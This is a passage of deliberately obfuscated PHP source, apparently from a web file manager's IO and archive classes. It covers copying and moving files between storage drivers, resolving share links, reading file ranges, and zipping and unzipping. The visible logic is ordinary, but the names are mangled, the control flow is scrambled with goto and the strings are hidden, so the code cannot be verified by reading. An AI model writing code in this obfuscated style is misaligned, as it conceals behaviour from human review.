$C×¼…ÀœÕ) && $Eîç¼šÏ«Ã->isFolder($eÜ¤Ğ·’ƒ´) && $Eîç¼šÏ«Ã->isParentOf($eÜ¤Ğ·’ƒ´, $F¦ÊêÀß¼¦)) { show_json(LNG($aõ‡Öò÷¥[1032]), !1); } if (!$Eîç¼šÏ«Ã->exist($eÜ¤Ğ·’ƒ´)) { show_json(LNG($aõ‡Öò÷¥[104]), !1); } } private static function copyPath($D›¿Êí¿Úª, $B¼ÅÉ«êÙ, $A¿Õ’õÒ, $C½³…ÍÄƒ, $e¹¶¯ù‘Í, $e‘ò®ŒÊŸ¸, $cİÅš¹ÂÁ, $AÉ•é²ÖİÄ = false) { goto F‡àğ¿…; eÏöæ—ª¿Ö: $BÖÉ¶¨¬Úº = $A¿Õ’õÒ->mkdir($A¿Õ’õÒ->getPath($AÊãĞ²ïã§)); $C½³…ÍÄƒ = $A¿Õ’õÒ->getPathInner($BÖÉ¶¨¬Úº); $Böğã“è×Ù = $D›¿Êí¿Úª->listPath($B¼ÅÉ«êÙ, !0); goto dŞŸËÖ”›; dŞŸËÖ”›: $AÁ…îªê ½ = array_merge($Böğã“è×Ù[$d­—¼‰òğ[73]], $Böğã“è×Ù[$d­—¼‰òğ[74]]); foreach ($AÁ…îªê ½ as $cÄ½‰ù») { $c¯Õ¢ ªö… = $cÄ½‰ù»[$d­—¼‰òğ[29]] == $d­—¼‰òğ[173]; $B¼ÅÉ«êÙ = $D›¿Êí¿Úª->getPathInner($cÄ½‰ù»[$d­—¼‰òğ[75]]); $cöªòáêŠÔ = self::copyPath($D›¿Êí¿Úª, $B¼ÅÉ«êÙ, $A¿Õ’õÒ, $C½³…ÍÄƒ, $e¹¶¯ù‘Í, $e‘ò®ŒÊŸ¸, $c¯Õ¢ ªö…); if (!$cöªòáêŠÔ) { IO::errorTips($d­—¼‰òğ[1033] . $B¼ÅÉ«êÙ . $d­—¼‰òğ[66] . $C½³…ÍÄƒ); } } return $BÖÉ¶¨¬Úº; goto EòêØØ¨Š°; F‡àğ¿…: $d­—¼‰òğ =& $_SERVER[ÉóçÄÇ]; $døëƒÑ«Ë = $AÉ•é²ÖİÄ ? $AÉ•é²ÖİÄ : $D›¿Êí¿Úª->pathThis($B¼ÅÉ«êÙ); if ($e¹¶¯ù‘Í) { $f”ÃÉÏÕîÇ = $A¿Õ’õÒ->fileNameExist($C½³…ÍÄƒ, $døëƒÑ«Ë); $døëƒÑ«Ë = $A¿Õ’õÒ->fileNameAuto($C½³…ÍÄƒ, $døëƒÑ«Ë, $e¹¶¯ù‘Í, !$cİÅš¹ÂÁ); $e¹¶¯ù‘Í = $f”ÃÉÏÕîÇ ? $e¹¶¯ù‘Í : !1; } goto a¾™ßŞßÒ; a¾™ßŞßÒ: if ($cİÅš¹ÂÁ) { return self::copyFile($D›¿Êí¿Úª, $B¼ÅÉ«êÙ, $A¿Õ’õÒ, $C½³…ÍÄƒ, $døëƒÑ«Ë, $e‘ò®ŒÊŸ¸); } if ($e¹¶¯ù‘Í == REPEAT_RENAME_FOLDER) { $e¹¶¯ù‘Í = !1; } $AÊãĞ²ïã§ = rtrim($C½³…ÍÄƒ, $d­—¼‰òğ[8]) . $d­—¼‰òğ[8] . $døëƒÑ«Ë; goto eÏöæ—ª¿Ö; EòêØØ¨Š°: } private static function copyFile($EÎ„¶œâå, $fÓŞ´Û¬Ÿ³, $CÓ°ö›·, $fù¸Œ¥Ÿíà, $AÀ…ï‚µò, $FÄÆ”Ùª¼†) { goto dåàñ”Àöè; DŒ…²æõªƒ: Hook::trigger($aòà—°Šº[1035], $EÎ„¶œâå, $fÓŞ´Û¬Ÿ³, $CÓ°ö›·, $fù¸Œ¥Ÿíà, $AÀ…ï‚µò, $b“¾ãÀÆ¨); if (self::driverIsSame($EÎ„¶œâå, $CÓ°ö›·)) { if ($FÄÆ”Ùª¼†) { $dÍ›¦«Ş› = $CÓ°ö›·->moveFile($fÓŞ´Û¬Ÿ³, $fù¸Œ¥Ÿíà); } else { $dÍ›¦«Ş› = $CÓ°ö›·->copyFile($fÓŞ´Û¬Ÿ³, $fù¸Œ¥Ÿíà); } Hook::trigger($aòà—°Šº[1036], $EÎ„¶œâå, $fÓŞ´Û¬Ÿ³, $CÓ°ö›·, $fù¸Œ¥Ÿíà, $AÀ…ï‚µò, $dÍ›¦«Ş›); return $dÍ›¦«Ş›; } $dÕÍƒÙó¿á = TEMP_FILES; goto F§¨ÎïÈÊã; dåàñ”Àöè: $aòà—°Šº =& $_SERVER[ÉóçÄÇ]; $fù¸Œ¥Ÿíà = $CÓ°ö›·->getPath(rtrim($fù¸Œ¥Ÿíà, $aòà—°Šº[8]) . $aòà—°Šº[8] . $AÀ…ï‚µò); $b“¾ãÀÆ¨ = $aòà—°Šº[1034] . time() . rand_string(5); goto DŒ…²æõªƒ; cÍ¡šœ´²ß: $c·ÄÉæ‚¤ = $EÎ„¶œâå->iconvApp($c·ÄÉæ‚¤); $dÍ›¦«Ş› = $CÓ°ö›·->upload($fù¸Œ¥Ÿíà, $c·ÄÉæ‚¤, $FÄÆ”Ùª¼†); self::remove($dÕÍƒÙó¿á . $b“¾ãÀÆ¨); goto cÖ ¹Í®• ; F§¨ÎïÈÊã: mk_dir($dÕÍƒÙó¿á); $c·ÄÉæ‚¤ = $dÕÍƒÙó¿á . $b“¾ãÀÆ¨; $c·ÄÉæ‚¤ = $EÎ„¶œâå->download($fÓŞ´Û¬Ÿ³, $c·ÄÉæ‚¤); goto cÍ¡šœ´²ß; cÖ ¹Í®• : Hook::trigger($aòà—°Šº[1036], $EÎ„¶œâå, $fÓŞ´Û¬Ÿ³, $CÓ°ö›·, $fù¸Œ¥Ÿíà, $AÀ…ï‚µò, $dÍ›¦«Ş›); return $dÍ›¦«Ş›; goto EæŞÓÃ’µÙ; EæŞÓÃ’µÙ: } public static function pathFather($DœîªÁä‰ä) { $D†ÆÕÊÉéë = IO::init($DœîªÁä‰ä); $a“¦öæ¡… = $D†ÆÕÊÉéë->pathFather($D†ÆÕÊÉéë->path); return $D†ÆÕÊÉéë->getPathOuter($a“¦öæ¡…); } public static function fileOut($B×„ó…öç, $F¨„ã¯Š§ = false, $Dëø”¾î‚è = false, $A§ Ù—±ä = '') { $Eº‹ç¾ÈÖÕ = self::driverMake($B×„ó…öç); if ($Eº‹ç¾ÈÖÕ->isFileOutServer()) { return $Eº‹ç¾ÈÖÕ->fileOutServer($B×„ó…öç, $F¨„ã¯Š§, $Dëø”¾î‚è, $A§ Ù—±ä); } return $Eº‹ç¾ÈÖÕ->fileOut($B×„ó…öç, $F¨„ã¯Š§, $Dëø”¾î‚è, $A§ Ù—±ä); } public static function fileOutImage($D¼À™–™Ç¼, $b³ÎÒ¥é = 250) { $FŞä¸ïÆ· = array(250, 600, 1200, 3000, 5000); for ($Eóßé÷†·Ë = 0; $Eóßé÷†·Ë < count($FŞä¸ïÆ·); $Eóßé÷†·Ë++) { if ($Eóßé÷†·Ë == 0 && $b³ÎÒ¥é <= $FŞä¸ïÆ·[$Eóßé÷†·Ë]) { $b³ÎÒ¥é = $FŞä¸ïÆ·[$Eóßé÷†·Ë]; break; } else { if ($b³ÎÒ¥é > $FŞä¸ïÆ·[$Eóßé÷†·Ë - 1] && $b³ÎÒ¥é <= $FŞä¸ïÆ·[$Eóßé÷†·Ë]) { $b³ÎÒ¥é = $FŞä¸ïÆ·[$Eóßé÷†·Ë]; break; } else { if ($Eóßé÷†·Ë == count($FŞä¸ïÆ·) - 1 && $b³ÎÒ¥é > $FŞä¸ïÆ·[$Eóßé÷†·Ë]) { $b³ÎÒ¥é = $FŞä¸ïÆ·[$Eóßé÷†·Ë]; break; } } } } $b­¯­Œ×Úó = self::driverMake($D¼À™–™Ç¼); if ($b­¯­Œ×Úó->isFileOutServer()) { return $b­¯­Œ×Úó->fileOutImageServer($D¼À™–™Ç¼, $b³ÎÒ¥é); } return $b­¯­Œ×Úó->fileOutImage($D¼À™–™Ç¼, $b³ÎÒ¥é); } private static function driverIsSame($a´Â”©ßç, $cÉ“¿ºÌš¸) { goto DÒ‡…±šÌ»; a¨ÂÎ»Ê: if ($a´Â”©ßç->pathDriver == $cÉ“¿ºÌš¸->pathDriver) { return !0; } return !1; goto dÖç¨ Ø³æ; DÒ‡…±šÌ»: $E¹À‘¥É—ê =& $_SERVER[ÉóçÄÇ]; $aââ‡ï¦—• = $a´Â”©ßç->getType(); $dºâæÓÃÚ¸ = $cÉ“¿ºÌš¸->getType(); goto f¢¤‹Ø’Ş¾; f¢¤‹Ø’Ş¾: if ($aââ‡ï¦—• != $dºâæÓÃÚ¸) { return !1; } if ($aââ‡ï¦—• == $E¹À‘¥É—ê[716]) { return !0; } if ($aââ‡ï¦—• == $E¹À‘¥É—ê[105]) { return !0; } goto a¨ÂÎ»Ê; dÖç¨ Ø³æ: } public static function copyUpdate($DÁí—Ïµù›, $BèùíÉÔ‰•) { goto fª¯‚Ù¶“Š; A²›–’†¹: Hook::trigger($C½ñ¦ïÓê[1040], $DÁí—Ïµù›, $BèùíÉÔ‰•, $d‚ãÎ£¦›©); foreach ($BÅä—«”Å as $DŒ™¥©çÔ·) { IO::mkdir($DŒ™¥©çÔ·); } foreach ($B²æÒâÏŠ¸ as $DŒ™¥©çÔ·) { IO::copy($DŒ™¥©çÔ·[$C½ñ¦ïÓê[1037]], $DŒ™¥©çÔ·[$C½ñ¦ïÓê[1038]], REPEAT_REPLACE); } goto F¦ùÑ¦ç»Œ; F¸¬Œ¼ÖŠ±: $BÅä—«”Å = array(); foreach ($d¡¯Ó¬Šˆ as $c›šŸø¡ˆô => $DŒ™¥©çÔ·) { if (isset($CÓ§Œí–ƒ[$c›šŸø¡ˆô])) { if ($DŒ™¥©çÔ·[$C½ñ¦ïÓê[76]] == 1) { continue; } if ($CÓ§Œí–ƒ[$c›šŸø¡ˆô][$C½ñ¦ïÓê[77]] == $DŒ™¥©çÔ·[$C½ñ¦ïÓê[77]]) { continue; } } if ($DŒ™¥©çÔ·[$C½ñ¦ïÓê[76]] == 1) { $BÅä—«”Å[] = $BèùíÉÔ‰• . $C½ñ¦ïÓê[8] . $c›šŸø¡ˆô; continue; } $D«‰¿÷î· = strstr(trim($c›šŸø¡ˆô, $C½ñ¦ïÓê[8]), $C½ñ¦ïÓê[8]) ? get_path_father($c›šŸø¡ˆô) : $C½ñ¦ïÓê[33]; $B²æÒâÏŠ¸[] = array($C½ñ¦ïÓê[1037] => $DŒ™¥©çÔ·[$C½ñ¦ïÓê[75]], $C½ñ¦ïÓê[1038] => rtrim($BèùíÉÔ‰•, $C½ñ¦ïÓê[8]) . $C½ñ¦ïÓê[8] . $D«‰¿÷î·, $C½ñ¦ïÓê[1039] => $DŒ™¥©çÔ·); } $d‚ãÎ£¦›© = array($C½ñ¦ïÓê[173] => $B²æÒâÏŠ¸, $C½ñ¦ïÓê[76] => $BÅä—«”Å); goto A²›–’†¹; fª¯‚Ù¶“Š: $C½ñ¦ïÓê =& $_SERVER[ÉóçÄÇ]; if (!IO::exist($DÁí—Ïµù›)) { return !1; } if (!IO::exist($BèùíÉÔ‰•)) { IO::mkdir($BèùíÉÔ‰•); } goto AÚ×‚èñóï; AÚ×‚èñóï: $d¡¯Ó¬Šˆ = self::_listAll($DÁí—Ïµù›); $CÓ§Œí–ƒ = self::_listAll($BèùíÉÔ‰•); $B²æÒâÏŠ¸ = array(); goto F¸¬Œ¼ÖŠ±; F¦ùÑ¦ç»Œ: } private static function _listAll($C±ëÊÖˆÊ) { $e—»¥¯¿»Ù =& $_SERVER[ÉóçÄÇ]; $C±ëÊÖˆÊ = KodIO::clear($C±ëÊÖˆÊ); $eÓª•¿‰í® = IO::listAll($C±ëÊÖˆÊ); foreach ($eÓª•¿‰í® as &$DÎÎ•­¸¶‘) { $bË²ÀˆÒÉŒ = substr($DÎÎ•­¸¶‘[$e—»¥¯¿»Ù[75]], strlen($C±ëÊÖˆÊ)); $DÎÎ•­¸¶‘[$e—»¥¯¿»Ù[1041]] = trim($bË²ÀˆÒÉŒ, $e—»¥¯¿»Ù[8]); } unset($DÎÎ•­¸¶‘); return array_to_keyvalue($eÓª•¿‰í®, $e—»¥¯¿»Ù[1041]); } public static function fileSubstr($D¦‰‰õÍÓ£, $A…ß¯éçßÁ, $CöŠÅà®ˆá = false) { goto CÓÅ¨Üğ; déò¸À”™Œ: $F·íÙš‹¬¤ = $A…ß¯éçßÁ; $f¶ä‰“ŞÏê = $CöŠÅà®ˆá; if ($A…ß¯éçßÁ < 0) { $A…ß¯éçßÁ = $A¹ÖÑ Ô¿Ä + $A…ß¯éçßÁ; } goto EË©í¯Ç‰–; d¹¹ØŸ†œß: if ($CöŠÅà®ˆá <= 0) { return $B³‡¹ÌÒ‰‡[33]; } if ($A…ß¯éçßÁ < 0 || $A…ß¯éçßÁ >= $A¹ÖÑ Ô¿Ä || $CöŠÅà®ˆá > 1024 * 1024 * 5) { throw new Exception("\x66\x69\154\x65\122\145\x61\x64\40\x65\162\x72\157\x72\41\40\x73\164\141\162\164\x3d{$A…ß¯éçßÁ}\73\154\x65\x6e\147\x74\150\x3d{$CöŠÅà®ˆá}\73\40\163\151\x7a\145\75{$A¹ÖÑ Ô¿Ä}\73"); } $B£‘ùÂ’Ì¬ = $e´©â£é¿Ç->fileSubstr($D¦‰‰õÍÓ£, $A…ß¯éçßÁ, $CöŠÅà®ˆá); goto D¦ŠÂÑ•ÇÖ; D¦ŠÂÑ•ÇÖ: if (!$B£‘ùÂ’Ì¬ && $CöŠÅà®ˆá && isset($GLOBALS[$B³‡¹ÌÒ‰‡[1044]])) { throw new Exception($GLOBALS[$B³‡¹ÌÒ‰‡[1044]][$B³‡¹ÌÒ‰‡[1045]]); } return $B£‘ùÂ’Ì¬; goto Aºæ„©„—°; EË©í¯Ç‰–: if ($CöŠÅà®ˆá === !1) { $CöŠÅà®ˆá = $A¹ÖÑ Ô¿Ä - $A…ß¯éçßÁ; } if ($A…ß¯éçßÁ + $CöŠÅà®ˆá > $A¹ÖÑ Ô¿Ä) { $CöŠÅà®ˆá = $A¹ÖÑ Ô¿Ä - $A…ß¯éçßÁ; } if (!$A¹ÖÑ Ô¿Ä && $e´©â£é¿Ç->getType() == $B³‡¹ÌÒ‰‡[105] && !$e´©â£é¿Ç->exist($D¦‰‰õÍÓ£)) { throw new Exception($B³‡¹ÌÒ‰‡[1042] . LNG($B³‡¹ÌÒ‰‡[1043]) . $B³‡¹ÌÒ‰‡[906] . get_path_this($D¦‰‰õÍÓ£) . $B³‡¹ÌÒ‰‡[33]); } goto d¹¹ØŸ†œß; CÓÅ¨Üğ: $B³‡¹ÌÒ‰‡ =& $_SERVER[ÉóçÄÇ]; $e´©â£é¿Ç = self::driverMake($D¦‰‰õÍÓ£); $A¹ÖÑ Ô¿Ä = $e´©â£é¿Ç->size($D¦‰‰õÍÓ£); goto déò¸À”™Œ; Aºæ„©„—°: } private static function driverMake(&$D‡¦ˆ´Øâê) { goto FŠ†Ğ¤Ö‰ğ; FŠ†Ğ¤Ö‰ğ: $Eµ“ŸĞÆ§ğ =& $_SERVER[ÉóçÄÇ]; $càøŒàŠ§ = KodIO::parse($D‡¦ˆ´Øâê); if (!self::$driverListSystem) { $eÕ†«¾ËãÇ = Model($Eµ“ŸĞÆ§ğ[725])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($eÕ†«¾ËãÇ, $Eµ“ŸĞÆ§ğ[388]); } goto A¶ÖŸÁ³ìµ; A¶ÖŸÁ³ìµ: if ($càøŒàŠ§[$Eµ“ŸĞÆ§ğ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$càøŒàŠ§[$Eµ“ŸĞÆ§ğ[388]]]) { return !1; } $D‡¦ˆ´Øâê = $càøŒàŠ§[$Eµ“ŸĞÆ§ğ[1046]]; $DË¨ËÔÅ§È = self::driverGet($càøŒàŠ§, $D‡¦ˆ´Øâê); goto dªƒÅ•’¡¾; dªƒÅ•’¡¾: return $DË¨ËÔÅ§È; goto f¾À®…ôÛ¾; f¾À®…ôÛ¾: } private static function driverGet($C‰À åœõ, &$EÃ§ïğà†) { goto cœÃ°äİŠÖ; eÎÊ´Ş‰: switch ($C‰À åœõ[$FÀíùà‹[29]]) { case KodIO::KOD_IO: $BöÖæ“ŒØ = self::$driverListSystem[$Cİ™¡ªÃÑÅ]; break; case KodIO::KOD_SOURCE: $EÃ§ïğà† = $Cİ™¡ªÃÑÅ . $EÃ§ïğà†; $BöÖæ“ŒØ = array($FÀíùà‹[1048] => $FÀíùà‹[1049], $FÀíùà‹[6] => $C‰À åœõ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $C·° á““— = $GLOBALS[$FÀíùà‹[1050]]; self::$driverListUser = array_to_keyvalue($C·° á““—, $FÀíùà‹[388]); } $BöÖæ“ŒØ = self::$driverListUser[$Cİ™¡ªÃÑÅ]; break; case KodIO::KOD_SHARE_LINK: $BöÖæ“ŒØ = array($FÀíùà‹[1048] => $FÀíùà‹[1051], $FÀíùà‹[6] => $C‰À åœõ); $C‘Æ¬‰ÍÜ = Action($FÀíùà‹[1052])->sharePathInfo($C‰À åœõ[$FÀíùà‹[75]]); $EÃ§ïğà† = $C‘Æ¬‰ÍÜ[$FÀíùà‹[390]]; if (!$C‘Æ¬‰ÍÜ[$FÀíùà‹[390]]) { $b¾Ä®Û÷ = Model($FÀíùà‹[558])->getInfo($C‘Æ¬‰ÍÜ[$FÀíùà‹[462]]); $EÃ§ïğà† = KodIO::clear($b¾Ä®Û÷[$FÀíùà‹[1053]] . $C‰À åœõ[$FÀíùà‹[1046]]); $C‰À åœõ[$FÀíùà‹[460]] = $b¾Ä®Û÷; $C‰À åœõ[$FÀíùà‹[1030]] = $EÃ§ïğà†; $BöÖæ“ŒØ = array($FÀíùà‹[1048] => $FÀíùà‹[1054], $FÀíùà‹[6] => $C‰À åœõ); } break; case KodIO::KOD_SHARE_ITEM: $BöÖæ“ŒØ = array($FÀíùà‹[1048] => $FÀíùà‹[1055], $FÀíùà‹[6] => $C‰À åœõ); $b¾Ä®Û÷ = Model($FÀíùà‹[558])->getInfo($C‰À åœõ[$FÀíùà‹[388]]); if ($b¾Ä®Û÷[$FÀíùà‹[390]] == $FÀíùà‹[491]) { $EÃ§ïğà† = KodIO::clear($b¾Ä®Û÷[$FÀíùà‹[1053]] . $C‰À åœõ[$FÀíùà‹[1046]]); $C‰À åœõ[$FÀíùà‹[460]] = $b¾Ä®Û÷; $C‰À åœõ[$FÀíùà‹[1030]] = $EÃ§ïğà†; $BöÖæ“ŒØ = array($FÀíùà‹[1048] => $FÀíùà‹[1056], $FÀíùà‹[6] => $C‰À åœõ); } else { if (!$EÃ§ïğà†) { $EÃ§ïğà† = $b¾Ä®Û÷[$FÀíùà‹[390]]; } } break; default: $EÃ§ïğà† = $C‰À åœõ[$FÀíùà‹[75]]; $BöÖæ“ŒØ = array($FÀíùà‹[1048] => $FÀíùà‹[1057]); break; } $F¾—–Ó¿„ë = $C‰À åœõ[$FÀíùà‹[75]]; if (!isset(self::$driverCache[$F¾—–Ó¿„ë])) { $FÕøÈ ÜĞ… = strtolower($BöÖæ“ŒØ[$FÀíùà‹[93]]); $aŒ…ğÕ•• = $GLOBALS[$FÀíùà‹[6]][$FÀíùà‹[87]][$FÀíùà‹[777]]; $E¹­£¬ = $FÀíùà‹[71] . (isset($aŒ…ğÕ••[$FÕøÈ ÜĞ…]) ? $aŒ…ğÕ••[$FÕøÈ ÜĞ…] : ucfirst($FÕøÈ ÜĞ…)); if (!class_exists($E¹­£¬)) { show_json("{$E¹­£¬}\40\156\x6f\x74\40\145\x78\x69\x73\x74\x73\41", !1); } $D÷Ş‡¹¼‰« = isset($BöÖæ“ŒØ[$FÀíùà‹[6]]) ? $BöÖæ“ŒØ[$FÀíùà‹[6]] : !1; self::$driverCache[$F¾—–Ó¿„ë] = new $E¹­£¬($D÷Ş‡¹¼‰«); } goto c»¸äÒ•ñ; C¡…‘ÍÊãŒ: $F¿¤Ñá›->path = $EÃ§ïğà†; return $F¿¤Ñá›; goto CøÊÅï¯¶; c»¸äÒ•ñ: $F¿¤Ñá› = self::$driverCache[$F¾—–Ó¿„ë]; $F¿¤Ñá›->pathDriver = $CÍŸŸÎ‚ÀŸ; $F¿¤Ñá›->pathBase = $FÀíùà‹[33]; goto bù”ç§å•¾; cœÃ°äİŠÖ: $FÀíùà‹ =& $_SERVER[ÉóçÄÇ]; $CÍŸŸÎ‚ÀŸ = $C‰À åœõ[$FÀíùà‹[1047]]; $Cİ™¡ªÃÑÅ = $C‰À åœõ[$FÀíùà‹[388]]; goto eÎÊ´Ş‰; bù”ç§å•¾: if (isset($BöÖæ“ŒØ[$FÀíùà‹[6]][$FÀíùà‹[1058]])) { $F¿¤Ñá›->pathBase = rtrim($BöÖæ“ŒØ[$FÀíùà‹[6]][$FÀíùà‹[1058]], $FÀíùà‹[8]) . $FÀíùà‹[8]; $EÃ§ïğà† = $F¿¤Ñá›->pathBase . ltrim($EÃ§ïğà†, $FÀíùà‹[8]); } $EÃ§ïğà† = $F¿¤Ñá›->getPath($EÃ§ïğà†); if (isset($C‰À åœõ[$FÀíùà‹[1030]])) { $EÃ§ïğà† = $C‰À åœõ[$FÀíùà‹[1030]]; } goto C¡…‘ÍÊãŒ; CøÊÅï¯¶: } public static function errorTips($eªˆƒİŠÇ® = false) { goto F§†‰ª·ÉÜ; F§†‰ª·ÉÜ: $CèÜí¬ÇÄß =& $_SERVER[ÉóçÄÇ]; static $B´Š­Ë‚¶ = array(); $DÂÛ¯ƒ½‘ = 1000; goto b ’…Ò†¥°; d³êàÅçëù: $B´Š­Ë‚¶[] = $eªˆƒİŠÇ®; write_log($CèÜí¬ÇÄß[159] . ACTION . $CèÜí¬ÇÄß[1059] . $eªˆƒİŠÇ®, $CèÜí¬ÇÄß[1060]); goto cŠ¯¸ÎõÈ; b ’…Ò†¥°: if ($eªˆƒİŠÇ® === -1) { return $B´Š­Ë‚¶ ? $B´Š­Ë‚¶[count($B´Š­Ë‚¶) - 1] : $CèÜí¬ÇÄß[33]; } if ($eªˆƒİŠÇ® === !1) { return implode($CèÜí¬ÇÄß[227], $B´Š­Ë‚¶); } if (count($B´Š­Ë‚¶) >= $DÂÛ¯ƒ½‘) { $B´Š­Ë‚¶ = array_slice($B´Š­Ë‚¶, $DÂÛ¯ƒ½‘ * 0.5, $DÂÛ¯ƒ½‘); } goto d³êàÅçëù; cŠ¯¸ÎõÈ: } public static function getLastError($a¤ßôÏÚ¨£ = '') { $F°¸‡¥´ª• = self::errorTips(-1); return $F°¸‡¥´ª• ? $F°¸‡¥´ª• : $a¤ßôÏÚ¨£; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $A¸Äù¾óì’; if (!$A¸Äù¾óì’) { $E²ËÃ–ö¢ì = IO::init($_SERVER[ÉóçÄÇ][8]); } return $E²ËÃ–ö¢ì; } private static function iconvSystem($D¬‚ÏóÜÏ) { return self::local()->iconvSystem($D¬‚ÏóÜÏ); } private static function iconvApp($CìäÓµ÷˜) { return self::local()->iconvApp($CìäÓµ÷˜); } public static function zip($E¹Ì´¤åÎ, $f”‡Œ‹Äµ = "\172\151\x70", $BÁÄ‰¥š¦é = '', $C‘”Óˆô = REPEAT_RENAME) { goto D»ÑĞÎÆéÈ; D»ÑĞÎÆéÈ: $eÎØù ¸˜ =& $_SERVER[ÉóçÄÇ]; $c®•É‘Å“’ = self::init($E¹Ì´¤åÎ[0][$eÎØù ¸˜[75]]); $e‘¯ŒØè°“ = self::info($E¹Ì´¤åÎ[0][$eÎØù ¸˜[75]]); goto aùÏ¯»¸‚‘; aùÏ¯»¸‚‘: $eê¡Œ¿…ˆ« = !1; if (!$BÁÄ‰¥š¦é && $c®•É‘Å“’->getType() == $eÎØù ¸˜[105]) { $BµÖÌÇ‘‡É = self::zipFileList($E¹Ì´¤åÎ); } else { $eê¡Œ¿…ˆ« = $BÁÄ‰¥š¦é ? $BÁÄ‰¥š¦é : TEMP_FILES . $eÎØù ¸˜[1061] . time() . rand_string(8) . $eÎØù ¸˜[8]; mk_dir($eê¡Œ¿…ˆ«); $BµÖÌÇ‘‡É = self::zipFileList($E¹Ì´¤åÎ, $eê¡Œ¿…ˆ«); } $cÖ½­Œ§ß = $e‘¯ŒØè°“[$eÎØù ¸˜[28]]; goto e‹“ö–éÊ; Fª¬çÙ»ô¿: $cÙÏÍùğâ = $B†Ğ¬Á±ÀØ . $cÖ½­Œ§ß . $eÎØù ¸˜[94] . $f”‡Œ‹Äµ; $cÙÏÍùğâ = get_filename_auto($cÙÏÍùğâ, $eÎØù ¸˜[33], $C‘”Óˆô); $dßƒµ³¨†× = self::iconvSystem($cÙÏÍùğâ); goto dƒÔ†Öšè¡; E…õ„áêíò: if (!$B®³¢ìõæ’) { del_dir($eê¡Œ¿…ˆ«); show_json(LNG($eÎØù ¸˜[1063]), !1); } del_dir($eê¡Œ¿…ˆ«); return $B®³¢ìõæ’; goto A²îÈÍàï¨; e‹“ö–éÊ: if (count($BµÖÌÇ‘‡É) > 1) { $DˆÏÏÃØ³– = IO::info(IO::pathFather($e‘¯ŒØè°“[$eÎØù ¸˜[75]])); $cÖ½­Œ§ß = $DˆÏÏÃØ³–[$eÎØù ¸˜[28]]; } $B†Ğ¬Á±ÀØ = $eê¡Œ¿…ˆ«; if (!$B†Ğ¬Á±ÀØ) { $B†Ğ¬Á±ÀØ = get_path_father($e‘¯ŒØè°“[$eÎØù ¸˜[75]]); if (!$BÁÄ‰¥š¦é && $c®•É‘Å“’->getType() == $eÎØù ¸˜[105]) { $B†Ğ¬Á±ÀØ = get_path_father($c®•É‘Å“’->path); } $bìµªé¼Èø = IO::info($B†Ğ¬Á±ÀØ); if (!$bìµªé¼Èø[$eÎØù ¸˜[194]]) { show_json(LNG($eÎØù ¸˜[1062]), !1); } } goto Fª¬çÙ»ô¿; Fà×†ŒÚ°›: if ($BÁÄ‰¥š¦é || !$eê¡Œ¿…ˆ«) { if ($eê¡Œ¿…ˆ« && strstr($eê¡Œ¿…ˆ«, TEMP_FILES)) { $eƒ˜ÅÍ¯¤ = $BµÖÌÇ‘‡É = array(); recursion_dir($B†Ğ¬Á±ÀØ, $eƒ˜ÅÍ¯¤, $BµÖÌÇ‘‡É, 0); foreach ($eƒ˜ÅÍ¯¤ as $CÎÏÀ¯”ï¨) { del_dir($CÎÏÀ¯”ï¨); } foreach ($BµÖÌÇ‘‡É as $CÈ¶ƒ–ÁàÔ) { if ($CÈ¶ƒ–ÁàÔ == $dßƒµ³¨†×) { continue; } del_file($CÈ¶ƒ–ÁàÔ); } } return $cÙÏÍùğâ; } $F«œñÀã´ = self::pathFather($e‘¯ŒØè°“[$eÎØù ¸˜[75]]); $B®³¢ìõæ’ = self::move($cÙÏÍùğâ, $F«œñÀã´, $C‘”Óˆô); goto E…õ„áêíò; dƒÔ†Öšè¡: foreach ($BµÖÌÇ‘‡É as $a…÷ç‚¨‚ => $f”ĞÕù®Åó) { $BµÖÌÇ‘‡É[$a…÷ç‚¨‚] = self::iconvSystem($f”ĞÕù®Åó); } KodArchive::create($dßƒµ³¨†×, $BµÖÌÇ‘‡É); if (!IO::exist($cÙÏÍùğâ)) { if ($eê¡Œ¿…ˆ«) { del_dir($eê¡Œ¿…ˆ«); } show_json(LNG($eÎØù ¸˜[1063]), !1); } goto Fà×†ŒÚ°›; A²îÈÍàï¨: } public static function unzip($EÂÀ­Üàˆˆ, $Ašïë‚ºä = "\162\x65\160\154\x61\143\x65") { goto aò´Ã–„ªÅ; aò´Ã–„ªÅ: $Bã·Õó‹ß« =& $_SERVER[ÉóçÄÇ]; $d£ÉâÉ‰ÓÈ = $EÂÀ­Üàˆˆ[$Bã·Õó‹ß«[75]]; $D˜´ï¤‡Ğ = $EÂÀ­Üàˆˆ[$Bã·Õó‹ß«[1064]]; goto cŒ„ÚÈ¨; cŒ„ÚÈ¨: if (!($A¸ë¹Ü½ = parent::info($d£ÉâÉ‰ÓÈ))) { show_json(LNG($Bã·Õó‹ß«[1065]), !1); } if (!($c±ÄêÄ’ = parent::infoFull($D˜´ï¤‡Ğ))) { $D˜´ï¤‡Ğ = parent::mkdir($D˜´ï¤‡Ğ); $c±ÄêÄ’ = array($Bã·Õó‹ß«[75] => $D˜´ï¤‡Ğ); } else { if (isset($c±ÄêÄ’[$Bã·Õó‹ß«[390]]) && trim($c±ÄêÄ’[$Bã·Õó‹ß«[75]], $Bã·Õó‹ß«[8]) != trim($D˜´ï¤‡Ğ, $Bã·Õó‹ß«[8])) { $eÎèááÄ” = KodIO::make($c±ÄêÄ’[$Bã·Õó‹ß«[472]]); $böØò‘†’­ = parent::fileNameAuto($eÎèááÄ”, $c±ÄêÄ’[$Bã·Õó‹ß«[28]], REPEAT_RENAME_FOLDER, !0); $D˜´ï¤‡Ğ = parent::mkdir($eÎèááÄ” . $böØò‘†’­); $c±ÄêÄ’ = array($Bã·Õó‹ß«[75] => $D˜´ï¤‡Ğ); } } $D˜´ï¤‡Ğ = $c±ÄêÄ’[$Bã·Õó‹ß«[75]]; goto C÷¾î¬ò£Ù; D½ãÆ§íŞÃ: $B«Š’ŠÃÇœ = KodArchive::extract($b‡êíÙ·Ö, $Aˆ”¶‚‡³¦ . $Bã·Õó‹ß«[8], $c÷ĞĞ¤÷î¤); self::archiveExt(); if (!$B«Š’ŠÃÇœ[$Bã·Õó‹ß«[1068]]) { show_json($Bã·Õó‹ß«[1069] . $B«Š’ŠÃÇœ[$Bã·Õó‹ß«[1070]], !1); } goto cö—©âš³œ; CŒ¼ëÛºÄ¡: return !0; goto a³µÆ„‚¹Ñ; Dâ¡ˆÆ•˜İ: if 